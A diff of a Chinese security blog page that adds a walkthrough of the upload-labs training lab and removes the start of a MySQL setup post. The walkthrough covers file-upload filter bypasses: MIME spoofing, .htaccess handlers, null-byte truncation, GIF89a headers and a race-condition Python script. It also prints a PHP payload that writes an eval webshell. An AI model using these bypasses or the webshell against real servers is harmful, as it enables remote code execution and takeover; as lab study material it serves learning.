@@ -169,6 +169,115 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/13/UPLOAD-LABs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hanbaiGG">
+      <meta itemprop="description" content="为什么不拉弟弟一把呢">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="灵能对抗实验室">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/13/UPLOAD-LABs/" class="post-title-link" itemprop="url">UPLOAD-LABs</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-13 15:24:55" itemprop="dateCreated datePublished" datetime="2021-11-13T15:24:55+08:00">2021-11-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-22 18:23:39" itemprop="dateModified" datetime="2021-11-22T18:23:39+08:00">2021-11-22</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="upload-labs简单wp"><a href="#upload-labs简单wp" class="headerlink" title="upload-labs简单wp"></a>upload-labs简单wp</h1><h2 id="pass1-前端js检查"><a href="#pass1-前端js检查" class="headerlink" title="pass1-前端js检查"></a>pass1-前端js检查</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>使用元素选择器选中上传区域<br>发现存在filecheck()的envent</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; onsubmit=&quot;return checkFile()&quot;&gt;</span><br><span class="line">                &lt;p&gt;请选择要上传的图片：&lt;/p&gt;&lt;p&gt;</span><br><span class="line">                &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;&gt;</span><br><span class="line">                &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">            &lt;/p&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>将<code>onsubmit=&quot;return checkFile()&quot;</code>删除后成功上传文件</p>
+<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>使用<code>burpsuit</code>抓包后发现文件命名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;x.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
+<p>上传任意图片<br>在bp中将内容改为一句话木马<br>文件名改为<code>.php</code><br>成功上传webshell</p>
+<h2 id="pass2-后端MIME检查"><a href="#pass2-后端MIME检查" class="headerlink" title="pass2-后端MIME检查"></a>pass2-后端MIME检查</h2><p>后端检查代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">           <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">           <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">           <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">               <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>上传图片马，使用<code>bp</code>抓包后更改后缀名<br>成功上传webshell</p>
+<h2 id="pass3-文件后缀黑名单"><a href="#pass3-文件后缀黑名单" class="headerlink" title="pass3-文件后缀黑名单"></a>pass3-文件后缀黑名单</h2><h3 id="正常解法"><a href="#正常解法" class="headerlink" title="正常解法"></a>正常解法</h3><p>查看提示<br>禁用了<code>&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;</code>这几个常用的文件后缀，但仍然可以使用<code>php5</code>等后缀名<br><strong>注意</strong><br>上述方法只能存在与apeach配置中存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddTyoe application/x-httpd-php .php.php5.php4.phtml</span><br></pre></td></tr></table></figure>
+<p>才能实现</p>
+<h3 id="特殊16进制截断"><a href="#特殊16进制截断" class="headerlink" title="特殊16进制截断"></a>特殊16进制截断</h3><p>通常是<code>0x00</code>对文件名后缀进行截断，但这道题目无法使用<br>后端查验代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>使用<code>0xf7</code>进行截断<br>成功上传webshell</p>
+<h2 id="pass4-黑名单绕过（-htaccess）"><a href="#pass4-黑名单绕过（-htaccess）" class="headerlink" title="pass4-黑名单绕过（.htaccess）"></a>pass4-黑名单绕过（.htaccess）</h2><p>这题禁用了所有的shell文件名后缀，带文件没有重命名，可以利用.htaccess执行图片马<br><strong>注意</strong><br><em>.htaccess需要apache配置文件中打开rwrite才能成功执行</em><br>.htaccess基础用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;evil.gif&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;IfModule mime_module&gt;</span><br><span class="line">AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行</span><br><span class="line">SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line">&lt;IfModule mime_module&gt;</span><br><span class="line">AddType application/x-httpd-php .gif</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
+<p>上传图形马<br>上传.htaccess<br><strong>注意</strong><br><em><code>.htaccess</code>是系统设置文件，因该以<code>Content-Type: application/octet-stream</code>上传</em></p>
+<h2 id="pass5-后缀大小写绕过"><a href="#pass5-后缀大小写绕过" class="headerlink" title="pass5-后缀大小写绕过"></a>pass5-后缀大小写绕过</h2><h2 id="pass6-空格绕过"><a href="#pass6-空格绕过" class="headerlink" title="pass6-空格绕过"></a>pass6-空格绕过</h2><h2 id="pass7-多写特殊字符绕过（-）"><a href="#pass7-多写特殊字符绕过（-）" class="headerlink" title="pass7-多写特殊字符绕过（..）"></a>pass7-多写特殊字符绕过（..）</h2><h2 id="pass8-特殊字符结尾绕过（-DATA）"><a href="#pass8-特殊字符结尾绕过（-DATA）" class="headerlink" title="pass8-特殊字符结尾绕过（::DATA）"></a>pass8-特殊字符结尾绕过（::DATA）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>
+<p>连续四关都是文件后缀名绕过，使用的思想是将后缀名改造成可以规避安检的形式</p>
+<h2 id="pass9-一次验证绕过"><a href="#pass9-一次验证绕过" class="headerlink" title="pass9-一次验证绕过"></a>pass9-一次验证绕过</h2><p>通过<code>bp</code>抓包可猜测，通过空格确定文件名，通过<code>.</code>确定后缀名，如果仅通过一次验证就可构造文件名绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php. .</span><br></pre></td></tr></table></figure>
+<h2 id="pass10-重写替换绕过"><a href="#pass10-重写替换绕过" class="headerlink" title="pass10-重写替换绕过"></a>pass10-重写替换绕过</h2><p>本pass中所有php都会被去除<br>以此构造文件名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.phphp</span><br></pre></td></tr></table></figure>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="pass11-get型00截断"><a href="#pass11-get型00截断" class="headerlink" title="pass11-get型00截断"></a>pass11-get型00截断</h2><p>路径通过get请求暴露，可自定义路径<br><strong>注意</strong><br><em>00截断只有在php 版本 &lt; 5.3.4且php的参数magic_quotes_gpc必须关闭的情况下才能使用</em><br>上传时抓包，将路径最后添加<code>shell.php%00</code>截断服务器读取，同时上传文件改为<code>.jpg</code><br>经过解析，<code>%00</code>成为<code>\0</code><br>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>
+<p>存储在<code>save_path</code>中的<code>\0</code>截断了后续代码<br>使得<code>shell.php\0248572.jpg</code>被认作<code>shell.php</code>上传</p>
+<h2 id="pass12-post型00截断"><a href="#pass12-post型00截断" class="headerlink" title="pass12-post型00截断"></a>pass12-post型00截断</h2><p>路径通过post请求暴露，可自定义路径<br><strong>注意</strong><br><em>00截断只有在php 版本 &lt; 5.3.4且php的参数magic_quotes_gpc必须关闭的情况下才能使用</em><br>上传时抓包，将路径最后添加<code>shell.php+</code>,在<code>burp</code>中将<code>+</code>的hex值改为<code>00</code>截断服务器读取，同时上传文件改为<code>.jpg</code></p>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>
+<p>存储在<code>save_path</code>中的<code>\0</code>截断了后续代码<br>使得<code>shell.php\0248572.jpg</code>被认作<code>shell.php</code>上传</p>
+<h2 id="pass13-文件头幻数"><a href="#pass13-文件头幻数" class="headerlink" title="pass13-文件头幻数"></a>pass13-文件头幻数</h2><p>使用<code>GIF89a</code>表示文件类型<br>绕过检测<br><code>include()</code>可以将文件以php方式运行，执行图片马<br>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="pass14-getimagesize-检查"><a href="#pass14-getimagesize-检查" class="headerlink" title="pass14-getimagesize()检查"></a>pass14-getimagesize()检查</h2><p>使用<code>GIF89a</code>表示文件类型<br>绕过检测<br><code>include()</code>可以将文件以php方式运行，执行图片马<br>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="pass15-exif-imagetype"><a href="#pass15-exif-imagetype" class="headerlink" title="pass15-exif_imagetype()"></a>pass15-exif_imagetype()</h2><p>使用<code>GIF89a</code>表示文件类型<br>绕过检测<br><code>include()</code>可以将文件以php方式运行，执行图片马<br>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="pass16-二次渲染"><a href="#pass16-二次渲染" class="headerlink" title="pass16-二次渲染"></a>pass16-二次渲染</h2><p>上传一张gif图片<br>使用winhex打开经过渲染的图片和原图进行比对<br>发现部分编码没有改变<br>在没有改变的部分写入代码<br>成功绕过。</p>
+<h2 id="pass17-条件竞争"><a href="#pass17-条件竞争" class="headerlink" title="pass17-条件竞争"></a>pass17-条件竞争</h2><p>服务端白名单检测，<br>但文件会先保存后删除，可通过burp与pythonrequest脚本同时请求访问木马。<br>python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">            test = requests.get(<span class="string">&quot;http://192.168.44.129:9096/upload/upload/success.php&quot;</span>)         //写入上传位置路径地址</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;260ca9dd8a4577fc00b7bd5810298076&quot;</span> <span class="keyword">in</span> test.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>上传木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line"><span class="keyword">echo</span> md5(success);</span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_REQUEST[123])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="pass18-条件竞争2"><a href="#pass18-条件竞争2" class="headerlink" title="pass18-条件竞争2"></a>pass18-条件竞争2</h2><p>同上</p>
+<h2 id="pass19-自定义文件名00截断"><a href="#pass19-自定义文件名00截断" class="headerlink" title="pass19-自定义文件名00截断"></a>pass19-自定义文件名00截断</h2>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/2021-11-1-wrrong/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -769,76 +878,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/31/mysql%E8%B8%A9%E5%9D%91%E9%81%BF%E9%9B%B7-%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="hanbaiGG">
-      <meta itemprop="description" content="为什么不拉弟弟一把呢">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="灵能对抗实验室">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/10/31/mysql%E8%B8%A9%E5%9D%91%E9%81%BF%E9%9B%B7-%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">mysql踩坑避雷_个人总结</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-10-31 12:57:59 / 修改时间：14:20:04" itemprop="dateCreated datePublished" datetime="2021-10-31T12:57:59+08:00">2021-10-31</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="MYSQL的安装"><a href="#MYSQL的安装" class="headerlink" title="MYSQL的安装"></a>MYSQL的安装</h1><pre><code>我使用的是phpstudy自带的mysql
-phpstudy是一款免费的集成mysql和apeach的网站开发工具，比较适合萌新使用。
-</code></pre>
